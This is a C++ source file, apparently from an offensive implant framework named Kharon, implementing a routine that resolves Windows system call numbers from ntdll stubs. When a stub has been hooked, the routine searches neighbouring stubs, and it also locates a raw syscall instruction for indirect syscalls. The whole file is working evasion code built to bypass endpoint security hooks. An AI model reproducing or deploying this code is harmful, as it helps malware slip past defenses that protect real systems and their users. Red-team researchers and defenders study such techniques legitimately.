#include <Kharon.h>

auto Syscall::Fetch(
    _In_ INT8 SysIdx
) -> BOOL {
    if ( !SysIdx ) return FALSE;

    UPTR FuncPtr = Ext[SysIdx].Address;

    // not hooked
    if ( 
         C_DEFB( FuncPtr + 0 ) == 0x4C &&
         C_DEFB( FuncPtr + 1 ) == 0x8B &&
         C_DEFB( FuncPtr + 2 ) == 0xD1 &&
         C_DEFB( FuncPtr + 3 ) == 0xB8 &&
         C_DEFB( FuncPtr + 6 ) == 0x00 &&
         C_DEFB( FuncPtr + 7 ) == 0x00 
    ) {
        BYTE High = C_DEFB( FuncPtr + 5 );
        BYTE Low  = C_DEFB( FuncPtr + 4 );
        Ext[SysIdx].ssn = ( High << 8 ) | Low;
        goto _KH_END;
    }

    // if hooked - case 1
    if ( C_DEFB( FuncPtr ) == 0xE9 ) {
        for ( INT i = 1; i <= SY_RANGE; i++ ) {
            if ( 
                 C_DEFB( FuncPtr + 0 + i * SY_DOWN ) == 0x4C &&
                 C_DEFB( FuncPtr + 1 + i * SY_DOWN ) == 0x8B &&
                 C_DEFB( FuncPtr + 2 + i * SY_DOWN ) == 0xD1 &&
                 C_DEFB( FuncPtr + 3 + i * SY_DOWN ) == 0xB8 &&
                 C_DEFB( FuncPtr + 6 + i * SY_DOWN ) == 0x00 &&
                 C_DEFB( FuncPtr + 7 + i * SY_DOWN ) == 0x00 
           ) {
               BYTE High = C_DEFB( FuncPtr + 5 + i * SY_DOWN );
               BYTE Low  = C_DEFB( FuncPtr + 4 + i * SY_DOWN );
               Ext[SysIdx].ssn = ( High << 8 ) | Low - i;
               goto _KH_END;
           }
           
            if ( 
                 C_DEFB( FuncPtr + 0 + i * SY_UP ) == 0x4C &&
                 C_DEFB( FuncPtr + 1 + i * SY_UP ) == 0x8B &&
                 C_DEFB( FuncPtr + 2 + i * SY_UP ) == 0xD1 &&
                 C_DEFB( FuncPtr + 3 + i * SY_UP ) == 0xB8 &&
                 C_DEFB( FuncPtr + 6 + i * SY_UP ) == 0x00 &&
                 C_DEFB( FuncPtr + 7 + i * SY_UP ) == 0x00 
            ) {
                BYTE High = C_DEFB( FuncPtr + 5 + i * SY_UP );
                BYTE Low  = C_DEFB( FuncPtr + 4 + i * SY_UP );
                Ext[SysIdx].ssn = ( High << 8 ) | Low + i;
                goto _KH_END;
            }
        }
    }

    // if hooked - case 2
    if ( C_DEFB( FuncPtr + 3 ) == 0xE9 ) {
        for ( INT i = 0; i <= SY_RANGE; i++ ) {
            if ( 
                 C_DEFB( FuncPtr + 0 + i * SY_DOWN ) == 0x4C &&
                 C_DEFB( FuncPtr + 1 + i * SY_DOWN ) == 0x8B &&
                 C_DEFB( FuncPtr + 2 + i * SY_DOWN ) == 0xD1 &&
                 C_DEFB( FuncPtr + 3 + i * SY_DOWN ) == 0xB8 &&
                 C_DEFB( FuncPtr + 6 + i * SY_DOWN ) == 0x00 &&
                 C_DEFB( FuncPtr + 7 + i * SY_DOWN ) == 0x00 
            ) {
                BYTE High = C_DEFB( FuncPtr + 5 + i * SY_DOWN );
                BYTE Low  = C_DEFB( FuncPtr + 4 + i * SY_DOWN );
                Ext[SysIdx].ssn = ( High << 8 ) | Low - i;
                goto _KH_END;
            }

            if ( 
                C_DEFB( FuncPtr + 0 + i * SY_UP ) == 0x4C &&
                C_DEFB( FuncPtr + 1 + i * SY_UP ) == 0x8B &&
                C_DEFB( FuncPtr + 2 + i * SY_UP ) == 0xD1 &&
                C_DEFB( FuncPtr + 3 + i * SY_UP ) == 0xB8 &&
                C_DEFB( FuncPtr + 6 + i * SY_UP ) == 0x00 &&
                C_DEFB( FuncPtr + 7 + i * SY_UP ) == 0x00 
            ) {
                BYTE High = C_DEFB( FuncPtr + 5 + i * SY_UP );
                BYTE Low  = C_DEFB( FuncPtr + 4 + i * SY_UP );
                Ext[SysIdx].ssn = ( High << 8 ) | Low + i;
                goto _KH_END;
            }
        }
    }

_KH_END:

    for ( INT x = 0, y = 1; x <= SY_RANGE; x++, y++ ) {
        if ( C_DEFB( FuncPtr + x ) == 0x0F && C_DEFB( FuncPtr + y ) == 0x05 ) {
            Ext[SysIdx].Instruction = U_PTR( FuncPtr + x ); break;
        }
    }

    if   ( Ext[SysIdx].ssn && Ext[SysIdx].Address && Ext[SysIdx].Instruction ) return TRUE;
    else return FALSE;
}